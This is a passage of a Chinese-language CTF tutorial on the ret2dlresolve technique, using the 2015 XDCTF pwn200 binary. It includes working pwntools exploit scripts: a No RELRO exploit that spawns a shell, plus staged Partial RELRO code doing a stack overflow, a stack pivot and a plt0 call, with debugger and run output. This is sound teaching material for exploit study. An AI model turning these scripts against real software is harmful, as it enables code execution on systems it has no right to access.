<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>運行效果如下</p> <div class=highlight><pre><span></span><code><span class=err>❯</span> <span class=n>python</span> <span class=n>exp</span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>relro</span><span class=o>.</span><span class=n>py</span>
<span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>local</span> <span class=n>process</span> <span class=s1>&#39;./main_no_relro_32&#39;</span><span class=p>:</span> <span class=n>pid</span> <span class=mi>35093</span>
<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#39;</span>
    <span class=n>Arch</span><span class=p>:</span>     <span class=n>i386</span><span class=o>-</span><span class=mi>32</span><span class=o>-</span><span class=n>little</span>
    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>No</span> <span class=n>RELRO</span>
    <span class=n>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
    <span class=n>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=n>PIE</span> <span class=p>(</span><span class=mh>0x8048000</span><span class=p>)</span>
<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>10</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=s1>&#39;./main_no_relro_32&#39;</span>
<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
<span class=err>$</span> <span class=n>ls</span>
<span class=n>exp</span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>relro</span><span class=o>.</span><span class=n>py</span>  <span class=n>main_no_relro_32</span>
</code></pre></div> <h3 id=partial-relro>Partial RELRO<a class=headerlink href=#partial-relro title="Permanent link">&para;</a></h3> <p>首先我們可以編譯源文件 main.c 得到二進制文件，這裏取消了 Canary 保護。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>gcc<span class=w> </span>-fno-stack-protector<span class=w> </span>-m32<span class=w> </span>-z<span class=w> </span>relro<span class=w> </span>-z<span class=w> </span>lazy<span class=w> </span>-no-pie<span class=w> </span>../../main.c<span class=w> </span>-o<span class=w> </span>main_partial_relro_32
❯<span class=w> </span>checksec<span class=w> </span>main_partial_relro_32
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti</span>
<span class=s1>al-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>在這種情況下，ELF 文件中的 .dynamic 節將會變成只讀的，這時我們可以通過僞造重定位表項的方式來調用目標函數。</p> <p>在下面的講解過程中，本文會按照以下兩種不同的方式來使用該技巧。</p> <ol> <li>通過手工僞造的方式使用該技巧，從而獲取 shell。這種方式雖然比較麻煩，但是可以仔細理解 ret2dlresolve 的原理。</li> <li>利用工具來實現攻擊，從而獲取 shell。這種方式比較簡單，但我們還是應該充分理解背後的原理，不能只是會使用工具。</li> </ol> <h4 id=_2>手工僞造<a class=headerlink href=#_2 title="Permanent link">&para;</a></h4> <p>這題我們不考慮有 libc 的情況。通過分析，我們可以發現程序有一個很明顯的棧溢出漏洞，緩衝區到返回地址間的偏移爲 112。</p> <div class=highlight><pre><span></span><code><span class=nf>gef</span><span class=err>➤</span><span class=w>  </span><span class=no>pattern</span><span class=w> </span><span class=no>create</span><span class=w> </span><span class=mi>200</span>
<span class=err>[+]</span><span class=w> </span><span class=nf>Generating</span><span class=w> </span><span class=no>a</span><span class=w> </span><span class=no>pattern</span><span class=w> </span><span class=no>of</span><span class=w> </span><span class=mi>200</span><span class=w> </span><span class=no>bytes</span>
<span class=nf>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>
<span class=err>[+]</span><span class=w> </span><span class=nf>Saved</span><span class=w> </span><span class=no>as</span><span class=w> </span><span class=err>&#39;</span><span class=no>$_gef0</span><span class=err>&#39;</span>
<span class=nf>gef</span><span class=err>➤</span><span class=w>  </span><span class=no>r</span>
<span class=nf>Starting</span><span class=w> </span><span class=no>program</span><span class=p>:</span><span class=w> </span><span class=err>/</span><span class=no>mnt</span><span class=err>/</span><span class=no>hgfs</span><span class=err>/</span><span class=no>ctf-challenges</span><span class=err>/</span><span class=no>pwn</span><span class=err>/</span><span class=no>stackoverflow</span><span class=err>/</span><span class=no>ret2dlresolve</span><span class=err>/</span><span class=mi>2015</span><span class=p>-</span><span class=no>xdctf-pwn200</span><span class=err>/</span><span class=mi>32</span><span class=err>/</span><span class=no>partial-relro</span><span class=err>/</span><span class=no>main_partial_relro_32</span>
<span class=nf>Welcome</span><span class=w> </span><span class=no>to</span><span class=w> </span><span class=no>XDCTF2015</span><span class=err>~</span><span class=p>!</span>
<span class=nf>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span>

<span class=nf>Program</span><span class=w> </span><span class=no>received</span><span class=w> </span><span class=no>signal</span><span class=w> </span><span class=no>SIGSEGV</span><span class=p>,</span><span class=w> </span><span class=no>Segmentation</span><span class=w> </span><span class=no>fault.</span>
<span class=err>[</span><span class=w> </span><span class=nl>Legend:</span><span class=w> </span><span class=nf>Modified</span><span class=w> </span><span class=no>register</span><span class=w> </span><span class=err>|</span><span class=w> </span><span class=no>Code</span><span class=w> </span><span class=err>|</span><span class=w> </span><span class=no>Heap</span><span class=w> </span><span class=err>|</span><span class=w> </span><span class=no>Stack</span><span class=w> </span><span class=err>|</span><span class=w> </span><span class=no>String</span><span class=w> </span><span class=p>]</span>
<span class=err>─────────────────────────────────────────────────────────────────────────</span><span class=w> </span><span class=nf>registers</span><span class=w> </span><span class=err>────</span>
<span class=nf>$eax</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0xc9</span>
<span class=nf>$ebx</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0x62616162</span><span class=w> </span><span class=p>(</span><span class=err>&quot;</span><span class=no>baab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nf>$ecx</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0xffffcddc</span><span class=w>  </span><span class=err>→</span><span class=w>  </span><span class=err>&quot;</span><span class=no>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=nf>$edx</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0x100</span>
<span class=nf>$esp</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0xffffce50</span><span class=w>  </span><span class=err>→</span><span class=w>  </span><span class=err>&quot;</span><span class=no>eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=nf>$ebp</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0x62616163</span><span class=w> </span><span class=p>(</span><span class=err>&quot;</span><span class=no>caab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nf>$esi</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0xf7fb0000</span><span class=w>  </span><span class=err>→</span><span class=w>  </span><span class=mi>0x001d7d6c</span>
<span class=nf>$edi</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0xffffcec0</span><span class=w>  </span><span class=err>→</span><span class=w>  </span><span class=mi>0x00000001</span>
<span class=nf>$eip</span><span class=w>   </span><span class=p>:</span><span class=w> </span><span class=mi>0x62616164</span><span class=w> </span><span class=p>(</span><span class=err>&quot;</span><span class=no>daab</span><span class=err>&quot;?</span><span class=p>)</span>
<span class=nl>$eflags:</span><span class=w> </span><span class=err>[</span><span class=nf>zero</span><span class=w> </span><span class=no>carry</span><span class=w> </span><span class=no>parity</span><span class=w> </span><span class=no>adjust</span><span class=w> </span><span class=no>SIGN</span><span class=w> </span><span class=no>trap</span><span class=w> </span><span class=no>INTERRUPT</span><span class=w> </span><span class=no>direction</span><span class=w> </span><span class=no>overflow</span><span class=w> </span><span class=no>RESUME</span><span class=w> </span><span class=no>virtualx86</span><span class=w> </span><span class=no>identification</span><span class=p>]</span>
<span class=nl>$cs:</span><span class=w> </span><span class=err>0</span><span class=nf>x0023</span><span class=w> </span><span class=no>$ss</span><span class=p>:</span><span class=w> </span><span class=mi>0x002b</span><span class=w> </span><span class=no>$ds</span><span class=p>:</span><span class=w> </span><span class=mi>0x002b</span><span class=w> </span><span class=no>$es</span><span class=p>:</span><span class=w> </span><span class=mi>0x002b</span><span class=w> </span><span class=no>$fs</span><span class=p>:</span><span class=w> </span><span class=mi>0x0000</span><span class=w> </span><span class=no>$gs</span><span class=p>:</span><span class=w> </span><span class=mi>0x0063</span>
<span class=err>─────────────────────────────────────────────────────────────────────────────</span><span class=w> </span><span class=nf>stack</span><span class=w> </span><span class=err>────</span>
<span class=err>0</span><span class=nf>xffffce50</span><span class=err>│+</span><span class=mi>0x0000</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa</span><span class=p>[...]</span><span class=err>&quot;</span><span class=w>    </span><span class=err>←</span><span class=w> </span><span class=no>$esp</span>
<span class=err>0</span><span class=nf>xffffce54</span><span class=err>│+</span><span class=mi>0x0004</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce58</span><span class=err>│+</span><span class=mi>0x0008</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce5c</span><span class=err>│+</span><span class=mi>0x000c</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce60</span><span class=err>│+</span><span class=mi>0x0010</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce64</span><span class=err>│+</span><span class=mi>0x0014</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce68</span><span class=err>│+</span><span class=mi>0x0018</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>0</span><span class=nf>xffffce6c</span><span class=err>│+</span><span class=mi>0x001c</span><span class=p>:</span><span class=w> </span><span class=err>&quot;</span><span class=no>laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa</span><span class=p>[...]</span><span class=err>&quot;</span>
<span class=err>───────────────────────────────────────────────────────────────────────</span><span class=w> </span><span class=nl>code:x86:</span><span class=err>32</span><span class=w> </span><span class=err>────</span>
<span class=err>[!]</span><span class=w> </span><span class=nf>Cannot</span><span class=w> </span><span class=no>disassemble</span><span class=w> </span><span class=no>from</span><span class=w> </span><span class=no>$PC</span>
<span class=err>[!]</span><span class=w> </span><span class=nf>Cannot</span><span class=w> </span><span class=no>access</span><span class=w> </span><span class=no>memory</span><span class=w> </span><span class=no>at</span><span class=w> </span><span class=no>address</span><span class=w> </span><span class=mi>0x62616164</span>
<span class=err>───────────────────────────────────────────────────────────────────────────</span><span class=w> </span><span class=nf>threads</span><span class=w> </span><span class=err>────</span>
<span class=err>[</span><span class=c1>#0] Id 1, Name: &quot;main_partial_re&quot;, stopped 0x62616164 in ?? (), reason: SIGSEGV</span>
<span class=err>─────────────────────────────────────────────────────────────────────────────</span><span class=w> </span><span class=nf>trace</span><span class=w> </span><span class=err>────</span>
<span class=err>────────────────────────────────────────────────────────────────────────────────────────</span>
<span class=err>0</span><span class=nf>x62616164</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=err>??</span><span class=w> </span><span class=p>()</span>
<span class=nf>gef</span><span class=err>➤</span><span class=w>  </span><span class=no>pattern</span><span class=w> </span><span class=no>search</span><span class=w> </span><span class=mi>0x62616164</span>
<span class=err>[+]</span><span class=w> </span><span class=nf>Searching</span><span class=w> </span><span class=err>&#39;</span><span class=mi>0x62616164</span><span class=err>&#39;</span>
<span class=err>[+]</span><span class=w> </span><span class=nf>Found</span><span class=w> </span><span class=no>at</span><span class=w> </span><span class=no>offset</span><span class=w> </span><span class=mi>112</span><span class=w> </span><span class=p>(</span><span class=no>little-endian</span><span class=w> </span><span class=no>search</span><span class=p>)</span><span class=w> </span><span class=no>likely</span>
</code></pre></div> <p>在下面的每一個階段中，我們會一步步地深入理解如何構造 payload。</p> <h5 id=stage-1>stage 1<a class=headerlink href=#stage-1 title="Permanent link">&para;</a></h5> <p>在這一階段，我們的目的比較簡單，就是控制程序直接執行 write 函數。在棧溢出的情況下，我們其實可以直接控制返回地址來控制程序直接執行 write 函數。但是這裏我們採用一個相對複雜點的辦法，即先使用棧遷移，將棧遷移到 bss 段，然後再來控制 write 函數。因此，這一階段主要包括兩步</p> <ol> <li>將棧遷移到 bss 段。</li> <li>通過 write 函數的 plt 表項來執行 write 函數，輸出相應字符串。</li> </ol> <p>這裏使用了 pwntools 中的 ROP 模塊。具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>結果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage1.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>25112</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
</code></pre></div> <h5 id=stage-2>stage 2<a class=headerlink href=#stage-2 title="Permanent link">&para;</a></h5> <p>在這一階段，我們將會進一步利用 <code>_dl_runtime_resolve</code> 相關的知識來控制程序執行 write 函數。</p> <ol> <li>將棧遷移到 bss 段。</li> <li>控制程序直接執行 plt0 中的相關指令，即 push linkmap 以及跳轉到 <code>_dl_runtime_resolve</code> 函數。這時，我們還需要提供 write 重定位項在 got 表中的偏移。這裏，我們可以直接使用 write plt 中提供的偏移，即 0x080483C6 處所給出的 0x20。其實，我們也可以跳轉到 0x080483C6 地址處，利用原有的指令來提供 write 函數的偏移，並跳轉到 plt0。</li> </ol> <div class=highlight><pre><span></span><code>.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public &#39;CODE&#39; use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; &#39; &#39;
.plt:080483CB                 jmp     sub_8048370
</code></pre></div> <p>具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># write &quot;/bin/sh&quot;</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>jmprel_data</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>writegot</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>]</span>
<span class=n>write_reloc_offset</span> <span class=o>=</span> <span class=n>jmprel_data</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>writegot</span><span class=p>,</span><span class=n>endian</span><span class=o>=</span><span class=s2>&quot;little&quot;</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=c1># fake write args, write(1, base_stage+80, sh)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>效果如下，仍然輸出了 sh 對應的字符串。</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage2.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>25131</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=m>32</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
